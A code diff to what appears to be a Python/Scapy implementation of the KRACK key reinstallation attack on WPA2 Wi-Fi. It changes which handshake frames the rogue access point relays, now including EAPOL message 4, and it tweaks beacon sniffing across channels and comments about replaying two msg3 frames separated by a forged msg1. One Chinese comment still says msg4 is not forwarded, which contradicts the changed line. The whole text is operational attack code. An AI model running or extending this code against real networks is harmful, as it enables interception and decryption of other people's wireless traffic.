@@ -171,7 +171,7 @@ class ClientState():
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
 				# 四次交握不轉送 msg4
-				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
+				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 4) or (p.type == 0 and p.subtype == 13)
 			return self.state in [ClientState.Success_Reinstalled]
 
 	def save_iv_keystream(self, iv, keystream):
@@ -234,13 +234,13 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def find_beacon(self, ssid):
-		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon) # opened_socket=self.sock_real iface=self.nic_real_mon
+		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
 		if ps is None or len(ps) < 1:
 			log(STATUS, "Searching for target network on other channels")
 			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
 				self.sock_real.set_channel(chan)
 				log(DEBUG, "Listening on channel %d" % chan)
-				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon) # , opened_socket=self.sock_real
+				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
 				if ps and len(ps) >= 1: break
 		if ps and len(ps) >= 1:
 			actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
@@ -304,7 +304,7 @@ class KRAckAttack():
 				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
 				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
 				packet_list = client.msg3s
-				# 插入一個 msg 假裝是正常的流程 (但是實測沒有作用，會導致失敗)
+				# 插入一個 msg 假裝是正常的流程 (但是實測沒有作用，會導致不回應 msg4 失敗)
 				# p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
 				# packet_list.insert(1, p)
 				for p in packet_list: self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
